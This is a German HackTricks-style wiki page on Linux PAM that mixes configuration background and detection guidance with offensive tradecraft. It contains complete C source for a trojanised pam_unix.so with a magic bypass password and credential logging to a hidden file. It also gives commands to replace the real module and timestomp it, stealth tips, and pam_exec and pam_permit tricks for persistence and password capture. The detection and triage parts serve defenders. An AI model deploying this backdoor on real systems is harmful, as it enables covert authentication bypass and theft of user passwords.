# PAM – Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Grundlegende Informationen

**PAM (Pluggable Authentication Modules)** dient als Sicherheitsmechanismus, der **die Identität von Benutzern überprüft, die auf Computerdienste zugreifen möchten**, und ihren Zugriff anhand verschiedener Kriterien steuert. Es ist mit einem digitalen Pförtner vergleichbar, der sicherstellt, dass nur autorisierte Benutzer bestimmte Dienste nutzen können, und ihre Nutzung gegebenenfalls einschränkt, um eine Überlastung des Systems zu verhindern.

#### Konfigurationsdateien

- **Solaris** unterstützt die veraltete zentrale Datei `/etc/pam.conf`, doch aktuelle Empfehlungen bevorzugen Dienstdateien unter `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux-Systeme** bevorzugen einen Verzeichnisansatz, bei dem dienstspezifische Konfigurationen in `/etc/pam.d` gespeichert werden. Die Konfigurationsdatei für den login-Dienst befindet sich beispielsweise unter `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Eine PAM-Konfiguration für den login-Dienst könnte beispielsweise so aussehen:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM-Verwaltungsbereiche**

Diese Bereiche oder Verwaltungsgruppen umfassen **auth**, **account**, **password** und **session**. Jeder ist für einen anderen Aspekt des Authentifizierungs- und Sitzungsverwaltungsprozesses zuständig:<sup>[[1]](#references)</sup>

- **Auth**: Überprüft die Identität des Benutzers, oft durch Abfrage eines Passworts.
- **Account**: Überprüft das Konto und prüft Bedingungen wie die Gruppenzugehörigkeit oder zeitliche Einschränkungen.
- **Password**: Verwaltet Passwortänderungen, einschließlich Komplexitätsprüfungen und Maßnahmen zur Verhinderung von Wörterbuchangriffen.
- **Session**: Verwaltet Aktionen beim Starten oder Beenden einer Dienstsitzung, etwa das Einbinden von Verzeichnissen oder das Festlegen von Ressourcenlimits.

#### **PAM-Modul-Steuerungen**

Die Steuerungen legen fest, wie das Modul auf Erfolg oder Fehler reagiert, und beeinflussen so den gesamten Authentifizierungsprozess. Dazu gehören:<sup>[[1]](#references)</sup>

- **Required**: Ein Fehler in einem erforderlichen Modul führt letztendlich zum Fehlschlag, jedoch erst, nachdem alle nachfolgenden Module geprüft wurden.
- **Requisite**: Beendet den Prozess bei einem Fehler sofort.
- **Sufficient**: Wenn kein vorheriges `required`-Modul fehlgeschlagen ist, führt ein Erfolg zur sofortigen Rückgabe und überspringt die übrigen Module derselben Verwaltungsgruppe.
- **Optional**: Führt nur dann zum Fehlschlag, wenn es das einzige Modul im Stack ist.

#### Offensive Semantik, die wichtig ist

Bei der Analyse oder Änderung von PAM bestimmt die **Position einer eingefügten Regel**, welcher Stack sie verarbeitet:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` und `substack` binden Regeln aus anderen Dateien ein. Änderungen an `sshd` wirken sich daher möglicherweise nur auf SSH aus, während Änderungen an `system-auth`, `common-auth` oder einem anderen gemeinsam genutzten Stack mehrere Dienste betreffen können.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM unterstützt außerdem Steuerungen in eckigen Klammern wie `[success=1 default=ignore]`. Diese lassen sich missbrauchen, um nach einer erfolgreichen benutzerdefinierten Prüfung **ein oder mehrere Module zu überspringen**, statt `pam_unix.so` sichtbar zu ersetzen.<sup>[[1]](#references)</sup>
- Der `module-path` kann **absolut** (`/usr/lib/security/pam_custom.so`) oder relativ zum standardmäßigen PAM-Modulverzeichnis sein. Auf modernen Linux-Systemen lauten die tatsächlichen Verzeichnisse häufig `/lib/security`, `/lib64/security`, `/usr/lib/security` oder Multiarch-Pfade wie `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Kurzer Hinweis für Operatoren: Ermittelt vor jeder Änderung stets den **vollständigen Dienstgraphen**. Wenn beispielsweise auf manchen Distributionen `sshd -> password-auth -> system-auth` oder auf anderen `sshd -> system-remote-login -> system-login -> system-auth` gilt, kann sich dasselbe einzeilige Implantat viel weiter auswirken als beabsichtigt.<sup>[[1]](#references)[[13]](#references)</sup>

Ein benutzerdefiniertes `auth`-Modul kann nach dem Kontopasswort eine interaktive Abfrage zu `sudo` hinzufügen. Prüft den effektiven Stack in `/etc/pam.d/sudo`, die eingebundene Richtlinie, die Modulargumente und die Berechtigungen jeder referenzierten lokalen Datendatei, bevor ihr die Abfrage manuell überprüft. Eine lesbare Liste mit Abfragewörtern umgeht weder die Passwortprüfung noch erteilt sie eine sudoers-Berechtigung. Ein privilegierter Wechsel erfordert weiterhin die korrekte Kontoauthentifizierung, den Abschluss aller erforderlichen PAM-Schritte und eine sudo-Regel, die Root-Rechte ermöglicht. Eine unbeaufsichtigte Enumeration sollte die Abfrage nicht auslösen.

Bei der älteren Ubuntu-Schwachstelle [`pam_motd`-Besitzrechtefehler (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) solltet ihr den tatsächlichen Build von `libpam-modules` prüfen und feststellen, ob ein Anmeldedienst das betroffene Sitzungsmodul aufruft. Ubuntu behob den Fehler mit **1.1.0-2ubuntu1.1** für 9.10 und **1.1.1-2ubuntu5** für 10.04 LTS; andere Releases oder Backports des Anbieters müssen jeweils separat bewertet werden. Für den beschriebenen Angriff musste der Aufrufer sein Home-Verzeichnis `.cache` durch einen Symlink ersetzen und anschließend eine PAM-Anmeldung auslösen. Dadurch änderte das alte Modul die Besitzrechte eines geschützten Ziels. Ein `.cache`-Eintrag, eine `pam_motd.so`-Zeile oder eine alte Kernelversion allein belegen keine Anfälligkeit. Prüft die Kontrolle über das Home-Verzeichnis, die effektive Modulversion, die Erreichbarkeit des Anmeldepfads, die Symlink-Behandlung und die Zielberechtigungen, ohne Dateien zu ersetzen oder während einer passiven Enumeration eine Anmeldung zu starten. Siehe [Ubuntus Sicherheitshinweis](https://ubuntu.com/security/notices/USN-959-1).

#### Beispielszenario

Bei einer Konfiguration mit mehreren auth-Modulen wird der Prozess in einer festgelegten Reihenfolge ausgeführt. Wenn das Modul `pam_securetty` feststellt, dass das Login-Terminal nicht autorisiert ist, werden Root-Anmeldungen blockiert. Aufgrund des Status "required" werden dennoch alle Module verarbeitet. `pam_env` setzt Umgebungsvariablen, was möglicherweise die Benutzerfreundlichkeit verbessert. Die Module `pam_ldap` und `pam_unix` arbeiten zusammen, um den Benutzer zu authentifizieren. Dabei versucht `pam_unix`, ein zuvor übermitteltes Passwort zu verwenden, was die Effizienz und Flexibilität der Authentifizierung erhöht.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` in einem Dienst-Stack

`pam_permit.so` meldet PAM-Prüfungen als erfolgreich. Kann ein Benutzer mit geringeren Rechten die effektive PAM-Richtlinie eines Dienstes ändern, lässt sich durch Einfügen dieses Moduls mit einem Steuerungsflag, das den Authentifizierungs-Stack vorzeitig beendet, die Passwortprüfung für diesen Dienst umgehen. Prüft bei `sudo` `/etc/pam.d/sudo` und alle eingebundenen Dateien wie `common-auth` oder `system-auth`, bevor ihr entscheidet, welche Dienste betroffen sind. Eine PAM-Authentifizierungsumgehung **erteilt keine neue sudoers-Regel**; der Benutzer muss weiterhin berechtigt sein, den angeforderten Befehl auszuführen. Prüft die Reihenfolge der Regeln und alle vorherigen `required`-Fehler, statt anzunehmen, dass eine einzelne Zeile mit `sufficient pam_permit.so` immer zum Erfolg führt.

## PAM mit einer Hintertür versehen – `pam_unix.so` hooken

Ein klassischer Persistence-Trick in wichtigen Linux-Umgebungen besteht darin, **die legitime PAM-Bibliothek durch ein trojanisiertes Drop-in zu ersetzen**. Auf einem Host, dessen PAM-Stack `pam_unix.so` lädt, können SSH- oder Konsolenanmeldungen dessen Einstiegspunkt `pam_sm_authenticate()` aufrufen. Ein bösartiger Ersatz kann Anmeldedaten abgreifen oder eine Umgehung mit einem *magischen* Passwort implementieren.<sup>[[2]](#references)[[11]](#references)</sup>

### Spickzettel zur Kompilierung
Die Skizze unten verwendet den Diensteinstiegspunkt `pam_sm_authenticate()` von Linux-PAM und `pam_get_authtok()`, um auf das Authentifizierungstoken zuzugreifen.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Beispiel für ein `pam_unix.so`-Trojaner</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Kompilieren und unauffällig ersetzen (das Ersetzungs-/Timestomp-Muster ist von Unit 42 dokumentiert). Passe sowohl den im Wrapper fest codierten Backup-Pfad als auch die nachfolgenden Befehle an das tatsächliche PAM-Modulverzeichnis des Ziels an:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec-Tipps
1. **Atomisches Überschreiben** – schreibe eine vollständige Library in eine temporäre Datei und benenne sie an ihren endgültigen Speicherort um, damit kein teilweise geschriebenes Authentifizierungsmodul zurückbleibt.
2. Ein Pfad wie `/usr/bin/.dbus.log` wurde in der AuthDoor-Analyse von Unit 42 beobachtet und ist daher ebenfalls ein nützlicher Indikator für die Suche.<sup>[[2]](#references)</sup>
3. Bewahre die vom PAM-Stack erwarteten Einstiegspunkte (zum Beispiel `pam_sm_authenticate` und `pam_sm_setcred`), damit andere Verwaltungsoperationen weiterhin funktionieren.<sup>[[11]](#references)[[18]](#references)</sup>

### Erkennung
Bei Paketintegritätsprüfungen überprüft RPM die Metadaten installierter Dateien, `debsums -s` meldet Prüfsummenfehler und `dpkg -S` im Triage-Block fragt die Paketzugehörigkeit ab; die Audit-Watch-Syntax protokolliert Schreibvorgänge und Attributänderungen an einem Pfad.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Vergleiche den MD5-/SHA256-Hash von `pam_unix.so` mit dem des Distributionspakets.
* Mit `rpm -V pam` oder `debsums -s libpam-modules` lassen sich ersetzte Libraries ohne manuelle Hash-Berechnung erkennen.
* Prüfe auf weltweit beschreibbare Dateien oder ungewöhnliche Eigentümer unter `/lib/security/`.
* `auditd`-Regel: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Durchsuche PAM-Konfigurationen nach unerwarteten Modulen: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Diese `pam_`-Suche übersieht benutzerdefinierte Module mit anderen `.so`-Dateinamen. Prüfe die **aktiven** `auth`-, `account`-, `password`- und `session`-Zeilen in `/etc/pam.d` (und, falls verwendet, `/etc/pam.conf`), einschließlich ihrer Control-Flags und aller eingebundenen Stacks. Ein unbekanntes Modul, das als `auth sufficient` vor der normalen Passwortprüfung platziert ist, sollte Anlass für eine Prüfung der Paketzugehörigkeit und des Binärprogramms sein; [PAMs Control-Syntax](https://man7.org/linux/man-pages/man5/pam.d.5.html) kann dazu führen, dass ein Erfolg diesen Teil des Stacks vorzeitig beendet. Ein Modulname, ein ungewöhnlicher Zeitstempel oder die Option `nodelay` allein beweisen keinen Bypass. Wenn das Verhalten auf einen Timing-Leak hindeutet, prüfe zuerst die Implementierung und die Erreichbarkeit des Dienstes; bei routinemäßiger Aufklärung sollten nicht wiederholt Authentifizierungsversuche mit verschiedenen Zugangsdaten ausgeführt werden.

### Schnelle Triage-Befehle (nach einem Kompromittieren oder zur Bedrohungssuche)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Missbrauch von `pam_exec` zur Persistenz
Statt `pam_unix.so` zu ersetzen, ist es weniger invasiv, eine `pam_exec`-Zeile an `/etc/pam.d/sshd` anzuhängen, sodass ein Aufruf, der diese PAM-Zeile erreicht, einen Helper ausführt, während der normale Stack intakt bleibt.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` erhält PAM-Metadaten in Umgebungsvariablen wie `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` und `PAM_TYPE`. Mit `expose_authtok` kann der Helper während der Phasen `auth` oder `password` bis zu `PAM_MAX_RESP_SIZE` Bytes des Passworts von `stdin` lesen. Wenn der Helper mit der effektiven UID statt der realen UID ausgeführt werden soll, füge `seteuid` hinzu.<sup>[[4]](#references)</sup>

Es folgen praktische Hinweise zu den Modultypen und dem für `pam_exec` dokumentierten Filter `type=`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` eignet sich besser für **Aktionen nach dem Login**, etwa zum erneuten Öffnen von Sockets oder zum Starten eines abgekoppelten Daemons.
- `auth optional pam_exec.so quiet expose_authtok ...` ist die übliche Wahl für **das Abgreifen von Zugangsdaten**, da es ausgeführt wird, bevor die Session geöffnet wird.
- Mit `type=session` oder `type=auth` lässt sich die Ausführung auf eine bestimmte PAM-Phase beschränken und eine unnötige doppelte Ausführung vermeiden.

Bei der Überprüfung von Berechtigungen ist ein absoluter Pfad zu einem `pam_exec.so`-Helper, in den der aktuelle Benutzer schreiben kann, ein möglicher Kandidat, selbst wenn die Datei mit dem Append-only-Attribut (`a`) markiert ist: [das Attribut erlaubt das Anhängen](https://man7.org/linux/man-pages/man1/chattr.1.html), was ausreichen kann, um das spätere Verhalten eines Shell-Skripts zu ändern. Stelle zunächst sicher, dass der PAM-Dienst und das Ereignis diese Zeile tatsächlich erreichen, dass dem Helper und seinem übergeordneten Pfad vertraut werden kann und dass der Befehl unter einer privilegierteren Identität ausgeführt wird; [`seteuid` ändert, welche PAM-UID verwendet wird](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Eine beschreibbare Datei oder ein `lsattr`-Ergebnis allein beweist keine privilegierte Ausführung.

### Distro-Tooling überdauern: `authselect`

Auf RHEL- und Fedora-Familien-Systemen, die `authselect` verwenden, können direkte Änderungen an generierten Dateien wie `/etc/pam.d/system-auth` oder `/etc/pam.d/password-auth` **von `authselect` überschrieben werden**. Für dauerhafte Änderungen passen Admins häufig das aktive benutzerdefinierte Profil unter `/etc/authselect/custom/<profile>/` an und wählen es anschließend erneut aus.<sup>[[5]](#references)[[19]](#references)</sup>

Typischer Ablauf mit root-Zugriff:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Dies ist sowohl für Offense als auch für die Triage wichtig: Wenn `/etc/pam.d/system-auth` die Banner `Generated by authselect` und `Do not modify this file manually` enthält, befindet sich der tatsächliche Persistence-Punkt möglicherweise unter `/etc/authselect/custom/` statt unter `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Aktuelle Tradecraft aus der Praxis

Aktuelle Berichte aus dem Jahr 2025 über die Linux-Backdoor **Plague** zeigen dieselbe Grundidee in weiterentwickelter Form: eine schädliche PAM-Komponente mit einem **statischen Bypass-Passwort** sowie dem Bereinigen von SSH-bezogenen Umgebungsvariablen und der Shell-History (`HISTFILE=/dev/null`), um nach dem Login weniger Sitzungsspuren zu hinterlassen.<sup>[[3]](#references)</sup> Dieses Muster eignet sich gut für die Suche, da sich die Backdoor-Logik in PAM befinden kann, während die Tarnungsartefakte erst **nach** erfolgreicher Authentifizierung auftreten.


## References

- [1] [pam.conf(5) / pam.d(5) – Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Das Handbuch des verdeckten Operators: Infiltration globaler Telekommunikationsnetze – Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems – Plague: Eine neu entdeckte PAM-basierte Backdoor für Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) – Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Konfigurieren der Benutzerauthentifizierung mit authselect – Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) – RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) – Debian-Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) – Debian-Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Authentifizierung verwalten in Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) – Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) – Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Handbuch zur Authentifizierung auf Systemebene – Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu-Paketdateiliste: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) – Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) – Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) – Debian-Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) – Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Änderungen/Authselect verpflichtend machen – Fedora-Projekt-Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
